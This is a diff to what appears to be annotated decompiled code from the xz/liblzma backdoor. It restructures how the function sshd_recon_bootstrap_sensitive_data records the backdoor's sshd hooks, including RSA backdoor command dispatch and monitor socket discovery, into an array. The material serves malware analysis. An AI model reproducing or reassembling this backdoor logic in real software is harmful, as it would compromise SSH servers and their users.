@@ -43,16 +43,7 @@ BOOL sshd_recon_bootstrap_sensitive_data
   u8 *code_scan_limit;
   sensitive_data *krb_candidate_local;
   sensitive_data *xzcalloc_candidate_local;
-  secret_data_item_t secret_probe_items;
-  code *run_backdoor_entry;
-  u64 run_backdoor_descriptor;
-  u64 usable_socket_descriptor;
-  code *usable_socket_entry;
-  u64 usable_socket_opcode;
-  u64 client_socket_descriptor;
-  code *client_socket_entry;
-  u64 client_socket_opcode;
-  u64 client_socket_flags;
+  secret_data_item_t secret_probe_items [4];
   
   zero_stride = 0;
   // AutoDoc: Emit breadcrumbs for the monitor command handlers so later refreshes can see that the recon code ran.
@@ -61,27 +52,33 @@ BOOL sshd_recon_bootstrap_sensitive_data
   if (operation_ok == FALSE) {
     return FALSE;
   }
-  run_backdoor_descriptor = 0x1b000001c8;
+  secret_probe_items[SECRET_PROBE_RSA_BACKDOOR_DISPATCH].bit_cursor = (secret_data_shift_cursor_t)0x1c8;
+  secret_probe_items[SECRET_PROBE_RSA_BACKDOOR_DISPATCH].operation_slot = 0x1b;
   // AutoDoc: Pre-populate a four-entry batch that records the proxy elevate helper plus the monitor socket discovery routines.
-  secret_probe_items.anchor_pc = (u8 *)sshd_monitor_cmd_dispatch;
-  secret_probe_items.bit_cursor = (secret_data_shift_cursor_t)0x1c8;
-  secret_probe_items.operation_slot = 0x1c;
-  run_backdoor_entry = rsa_backdoor_command_dispatch;
-  secret_probe_items.bits_to_shift = 0;
-  secret_probe_items.ordinal = 1;
-  usable_socket_descriptor = 0x100000000;
-  usable_socket_entry = sshd_find_socket_fd_by_shutdown_probe;
-  usable_socket_opcode = 0x1a000001c3;
-  client_socket_descriptor = 0x100000005;
-  client_socket_entry = sshd_get_monitor_comm_fd;
-  client_socket_opcode = 0x19000001bd;
-  client_socket_flags = 0x100000006;
+  secret_probe_items[SECRET_PROBE_MONITOR_CMD_DISPATCH].anchor_pc = (u8 *)sshd_monitor_cmd_dispatch;
+  secret_probe_items[SECRET_PROBE_MONITOR_CMD_DISPATCH].bit_cursor = (secret_data_shift_cursor_t)0x1c8;
+  secret_probe_items[SECRET_PROBE_MONITOR_CMD_DISPATCH].operation_slot = 0x1c;
+  secret_probe_items[SECRET_PROBE_RSA_BACKDOOR_DISPATCH].anchor_pc = (u8 *)rsa_backdoor_command_dispatch;
+  secret_probe_items[SECRET_PROBE_MONITOR_CMD_DISPATCH].bits_to_shift = 0;
+  secret_probe_items[SECRET_PROBE_MONITOR_CMD_DISPATCH].ordinal = 1;
+  secret_probe_items[SECRET_PROBE_RSA_BACKDOOR_DISPATCH].bits_to_shift = 0;
+  secret_probe_items[SECRET_PROBE_RSA_BACKDOOR_DISPATCH].ordinal = 1;
+  secret_probe_items[SECRET_PROBE_SOCKET_SHUTDOWN_PROBE].anchor_pc = (u8 *)sshd_find_socket_fd_by_shutdown_probe;
+  secret_probe_items[SECRET_PROBE_SOCKET_SHUTDOWN_PROBE].bit_cursor = (secret_data_shift_cursor_t)0x1c3;
+  secret_probe_items[SECRET_PROBE_SOCKET_SHUTDOWN_PROBE].operation_slot = 0x1a;
+  secret_probe_items[SECRET_PROBE_SOCKET_SHUTDOWN_PROBE].bits_to_shift = 5;
+  secret_probe_items[SECRET_PROBE_SOCKET_SHUTDOWN_PROBE].ordinal = 1;
+  secret_probe_items[SECRET_PROBE_MONITOR_COMM_FD].anchor_pc = (u8 *)sshd_get_monitor_comm_fd;
+  secret_probe_items[SECRET_PROBE_MONITOR_COMM_FD].bit_cursor = (secret_data_shift_cursor_t)0x1bd;
+  secret_probe_items[SECRET_PROBE_MONITOR_COMM_FD].operation_slot = 0x19;
+  secret_probe_items[SECRET_PROBE_MONITOR_COMM_FD].bits_to_shift = 6;
+  secret_probe_items[SECRET_PROBE_MONITOR_COMM_FD].ordinal = 1;
   // AutoDoc: Push all four breadcrumbs into the log in one shot; a failure here aborts before any ELF parsing happens.
-  operation_ok = secret_data_append_items_batch(&secret_probe_items,4,secret_data_append_item_if_enabled);
+  operation_ok = secret_data_append_items_batch(secret_probe_items,4,secret_data_append_item_if_enabled);
   if (operation_ok == FALSE) {
     return FALSE;
   }
-  probe_cursor = &secret_probe_items;
+  probe_cursor = secret_probe_items;
   // AutoDoc: Scrub the temporary append batch once it lands in the log so the stack copy can't be re-used or leaked.
   for (probe_clear_idx = 0x18; probe_clear_idx != 0; probe_clear_idx = probe_clear_idx + -1) {
     *(u32 *)&probe_cursor->anchor_pc = 0;
